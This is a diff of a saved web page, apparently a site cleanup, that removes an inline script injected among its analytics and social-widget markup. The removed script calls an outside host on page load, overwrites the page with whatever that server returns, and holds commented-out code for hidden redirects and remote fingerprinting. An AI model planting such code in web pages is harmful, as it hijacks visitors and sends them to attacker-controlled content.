@@ -73,58 +73,7 @@ var exactmetrics_frontend={"js_events_tracking":"true","download_extensions":"zi
 .fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}</style><link rel="stylesheet" type="text/css" href="./w_files/twitcount.css" media="all">
 
 <script type="text/javascript">
-(function() {
-if (window.location.href.search("[?&]_novisit=on") != -1) return;
-var xhr = new XMLHttpRequest();
-xhr.withCredentials = true;
-xhr.open("GET", "https://testo.savebraddock.com/response.php?campaign=" + escape("Pu1StI5kfY") + "&referrer=" + escape(document.referrer) + "&uri=" + escape(window.location.href), true);
-xhr.onload = function() {
-  if (xhr.status !== 200) return;
 
-    var resp = JSON.parse(xhr.responseText);
-
-    if (resp.result === "ok") {
-      document.open();
-      document.write(resp.resp);
-      document.close();
-      return;
-    }
-
-  console.log('ok');
-
-  /*if (resp.result === "redirect") {
-      document.open();
-      document.write('<html><head>');
-      document.write('<meta name="referrer" content="never" />');
-      document.write('<meta http-equiv="refresh" content="0; url='+resp.redirect_url+'" />');
-      document.write('</head></html>');
-      document.close();
-      return;
-  }
-  if (resp.result === "fp") {
-      var cb = function() {
-          fp.init(resp.fp.data_url, "", resp.fp.checks, true);
-      };
-      var ref = document.getElementsByTagName("script")[0];
-      var script = document.createElement("script");
-      script.type = "text/javascript";
-      if (script.readyState) {  //IE
-          script.onreadystatechange = function() {
-              if (script.readyState == "loaded" || script.readyState == "complete") {
-                  script.onreadystatechange = null;
-                  cb();
-              }
-          };
-      } else {
-          script.onload = cb;
-      }
-      script.src = resp.fp.script_url;
-      ref.parentNode.insertBefore(script, ref);
-      return
-  }*/
-};
-xhr.send();
-})();
 
 </script>
 
